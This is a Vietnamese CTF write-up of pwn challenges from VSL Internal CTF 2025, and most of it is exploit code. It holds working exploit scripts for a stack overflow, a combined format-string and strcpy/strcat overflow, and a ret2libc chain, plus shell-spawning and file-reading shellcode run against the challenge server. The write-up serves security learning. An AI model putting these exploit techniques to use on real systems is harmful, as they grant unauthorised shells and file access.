---
title: "[WRITE UP] - VSL Internal CTF 2025"
published: 2025-01-31
description: "Write up for all pwn challenges"
image: "./image.png"
tags:
  - PWN
category: "CTF Write ups"
draft: false
---

# Tản mạn

Vậy là cũng đã hết Tết, sau một thời gian lười dài ơi là dài thì mình quyết định bắt đầu viết full write up cho giải `VSL Internal CTF 2025` được tổ chức bởi `VKU`. Trong giải này mình đã may mắn được tham gia cùng các anh chị `EHC`, và cùng nhau được top 2

![alt text](image-1.png)

Dưới đây sẽ là phần giải của mình cho tất cả những bài pwn mình làm được, kèm theo lời giải thích ngắn gọn

# Challenges

## Beginner

```sh
[*] '/home/alter/CTFs/VSL/Beginner/bofbegin'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[12]; // [esp+4h] [ebp-28h] BYREF
  char v5[12]; // [esp+10h] [ebp-1Ch] BYREF
  int v6; // [esp+1Ch] [ebp-10h]
  unsigned int v7; // [esp+20h] [ebp-Ch]
  int *p_argc; // [esp+24h] [ebp-8h]

  p_argc = &argc;
  v7 = __readgsdword(0x14u);
  v6 = GUEST_ID;
  printf("Enter username: ");
  fflush(stdout);
  gets(s);
  printf("Enter password: ");
  fflush(stdout);
  gets(v5);
  if ( !strcmp(s, "admin") )
  {
    if ( v6 == ROOT_ID )
    {
      puts("Welcome, root!");
      fflush(stdout);
      system("/bin/sh");
    }
    else
    {
      if ( v6 == GUEST_ID )
        puts("Welcome, guest!");
      else
        puts("Nice try, but you are not root!");
      fflush(stdout);
    }
  }
  else
  {
    printf("Welcome, %s!\n", s);
    fflush(stdout);
  }
  return 0;
}
```

Dựa vào IDA ta thấy được đây là một bài `Buffer Overflow` đơn giản khi những gì ta cần chỉ là cho v6 bằng `ROOT_ID`, khi check kĩ `.data` hơn thì mình thấy `ROOT_ID` được khai báo với giá trị `1337`. Và đây là exploit của mình cho bài này:

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./bofbegin', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    pl = b'A'*0xc + p32(1337)

    sl(b'admin')
    sl(pl)

    interactive()

if __name__ == '__main__':
    exploit()
```

## Interesting Functions

```sh
[*] '/home/alter/CTFs/VSL/Interesting_Functions/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Một bài khá hay về `Buffer Overflow` và `Format String`, hãy cùng xem IDA xem nó có những gì:

- `main()`:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-110h] BYREF
  char v5[267]; // [rsp+1h] [rbp-10Fh] BYREF
  int v6; // [rsp+10Ch] [rbp-4h] BYREF

  memset(&s, 0, 0x101uLL);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  menu();
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      if ( (unsigned int)__isoc99_scanf("%d%*c", &v6) != 1 )
        return 1;
      if ( v6 != 3 )
        break;
      if ( s )
      {
        puts("You only have one chance to print string");
      }
      else
      {
        printf(v5);
        s = 1;
      }
    }
    if ( v6 > 3 )
      break;
    if ( v6 == 1 )
    {
      get_data();
      strcpy(v5, g_buf);
    }
    else
    {
      if ( v6 != 2 )
        return 0;
      get_data();
      strcat(v5, g_buf);
    }
  }
  return 0;
}
```

- `get_data()`:
```
char *get_data()
{
  printf("data: ");
  return fgets(g_buf, 256, stdin);
}
```
- `win()`:
```c
int win()
{
  int result; // eax
  char buf[108]; // [rsp+0h] [rbp-70h] BYREF
  int fd; // [rsp+6Ch] [rbp-4h]

  fd = open("flag.txt", 0, 0LL);
  result = pwd;
  if ( pwd == 4919 )
  {
    read(fd, buf, 0x64uLL);
    return puts(buf);
  }
  return result;
}
```

Nhìn sơ qua thì tưởng chừng không có `Buffer Overflow` nhưng khi để ý kĩ thì ta thấy flow của chương trình sẽ là:

- Cho ta chọn các options
- Nếu `1` thì sẽ nhận input của ta thông qua hàm `get_data()`, và rồi sử dụng `strcpy()` để copy data đó vào `buf` (là phần được khai báo trên stack)
- Nếu `2` thì sẽ nhận input của ta thông qua hàm `get_data()`, và rồi sử dụng `strcat()` để copy data đó vào `buf` (là phần được khai báo trên stack)
- Nếu là `3` thì sẽ in ra input mà ta nhập nhưng chỉ được sử dụng một lần

Nhưng đặt biệt ở đây là chương trình sử dụng `strcpy` và `strcat`, điều nguy hiểm ở đây là `strcpy` sẽ copy dữ liệu của ta và sẽ không quan tâm đến kích thước của đoạn dữ liệu mà nó copy cho đến khi nó gặp `NULL BYTE`, nhưng vì ở đây hàm `fgets` được set input size là `256` nên nó chỉ sẽ copy được `256` byte dữ liệu của ta. Nhưng bên cạnh đó ta có thể sử dụng thêm `strcat` để nốt chuỗi, `strcat` sẽ nối chuỗi sau mà ta nhập vào nơi có kí tự kết thúc hay `NULL` mà nó bắt gặp, ghi đè nó, và khi nối xong nó sẽ thêm `NULL` vào cuối của đoạn `data` đó. Nên ở bài này idea của mình sẽ là dùng `strcpy` và `strcat` để thực hiện `Buffer Overflow` và bên cạnh đó sử dụng `Format String` ở option 3 (`printf(v5)`), để thay đổi giá trị của `pwd` ban đầu được khai báo ở `.bss` thành `4919`.

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+238
b*main+279
b*main+316
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
The strcat() function appends the src string to the dest string,
overwriting the terminating null byte ('\0') at
the end of dest and then adds a terminating null byte.
'''

'''
[*] '/home/alter/CTFs/VSL/Interesting_Functions/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

def exploit():

    # 1. strcpy
    # 2. strcat
    # 3. printf

    # Change pwd value
    pl = f'%{0x1337}c%9$n'.encode()
    pl = pl.ljust(0x17, b'A')
    pl += p64(0x4041c0) # pwd

    sla(b'> ', b'1')
    sla(b'data: ', pl)
    sla(b'> ', b'3')

  # Buffer Overflow
  # Add NULL byte at the end of the first time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 2)*b'B' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end second time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 1)*b'C' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end third time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = cyclic(cyclic_find(b'gaaa')) + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Break the loop and return to win
    sla(b'> ', b'4')

    interactive()

if __name__ == '__main__':
    exploit()
```

Ở exploit mình sử dụng `strcat` như là thứ để đặt `NULL` byte vào `saved rip` để `reset` nó về `0` để ta có thể ghi giá trị mới vào nó, vì nếu ta dùng `strcat` để nối chuỗi có địa chỉ của hàm `win` vào thì nó chỉ có thể bị ghi đè `4 bytes` cuối và điều này sẽ làm chương trình bị crash.

## Present

```sh
[*] '/home/alter/CTFs/VSL/Present/libpwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[48]; // [rsp+20h] [rbp-30h] BYREF

  setup((unsigned int)argc, argv, envp);
  puts("Hi, Welcome to the pwn challenge!");
  puts("This program is just a print function. Bye!");
  puts("But wait, I have a present for you!");
  printf("%p\n", &fgets);
  printf("Please give me your present: ");
  gets(v4);
  return 0;
}
```

Một bài thể hiện rõ kĩ thuật `ret2libc`, nên mình không suy nghĩ gì thêm và viết exploit luôn:

```py
#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./libpwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+152
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def exploit():

    ru(b'But wait, I have a present for you!\n')
    libc.address = hexleak(rl()) - libc.sym.fgets
    slog('Libc base',libc.address)

    pl = cyclic(0x38) + p64(0x0000000000401016) + p64(0x000000000010f75b + libc.address) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
    sla(b'present:', pl)

    interactive()

if __name__ == '__main__':
    exploit()
```

## asm machine

Ở bài này là một bài shellcode và là một bài khá thú vị đối với cá nhân mình, flow của chương trình chỉ cơ bản là thực thi những đoạn mã `assembly` mà ta nhập vào nên mình đã không ngần ngại viết một đoạn shellcode để `get shell`:

```sh
alter ^ Sol in ~/CTFs/VSL/Present
$ nc 61.14.233.78 10004
Enter your assembly code (type 'end' to finish):
section .text
    global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 11
    int 0x80

end
[!] Compiling and running the assembly code...
ls
entry.sh
main.py
cd ..
ls
app
bin
boot
dev
etc
flag.txt
<...>
cat flag.txt
VSL{d0d73fb9a4d7e40b0cc6870fc2c4ba67}
```

Ngoài ra mình có thử shellcode `orw` xem nó có hoạt động không:

```sh
alter ^ Sol in ~/CTFs/VSL/Present
$ nc 61.14.233.78 10004
Enter your assembly code (type 'end' to finish):
section .data
    filename db '/flag.txt', 0

section .text
    global _start

_start:
    ; open
    xor eax, eax
    mov ebx, filename
    xor ecx, ecx
    mov al, 5
    int 0x80

    ; read
    mov ebx, eax
    xor eax, eax
    mov ecx, esp
    mov edx, 100
    mov al, 3
    int 0x80

    ; write
    mov eax, 4
    mov ebx, 1
    int 0x80

    xor eax, eax
    mov al, 1
    xor ebx, ebx
    int 0x80

end
[!] Compiling and running the assembly code...
VSL{d0d73fb9a4d7e40b0cc6870fc2c4ba67}n��
                                        o��o��&o��>o��wo���o���o���o�� @��!��3�
[+] Assembly code compiled and run successfully
```

Ở bài này thì mình không có bị gặp việc end `EOF` khi thực thi `execve` nhưng anh `mentor` của mình thì có 🥹.  Nên ta có thể sử dụng syscall `getdents` để list ra những thứ có trong thư  mục đó từ đó tìm đc path đúng của flag và viết shellcode `orw` cho nó
